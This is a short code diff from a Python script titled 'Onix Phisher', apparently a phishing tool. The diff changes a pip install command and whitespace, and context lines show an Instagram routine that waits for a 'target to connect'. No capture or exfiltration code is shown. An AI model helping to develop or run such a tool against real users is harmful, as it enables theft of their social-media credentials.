@@ -31,12 +31,12 @@ else:
     except (ImportError , ModuleNotFoundError):
         install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) ⮞ ")
         if install == "y":
-            os.system("sudo pip install -r requirements_linux.txt")
+            os.system("sudo pip install colorama pandas")
             sleep(0.5)
             pass
         else:
             exit(Fore.GREEN + "\nhave a good day".title())
-
+        
 #Change Title====================================================================================================
 if os.name == "nt":
     os.system("title Onix Phisher")
@@ -156,6 +156,7 @@ def instagram():
     linecache.clearcache()
     print("")
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n" + Fore.RESET)
+    
 #Write info====================================================================================================
     try:
         while True:
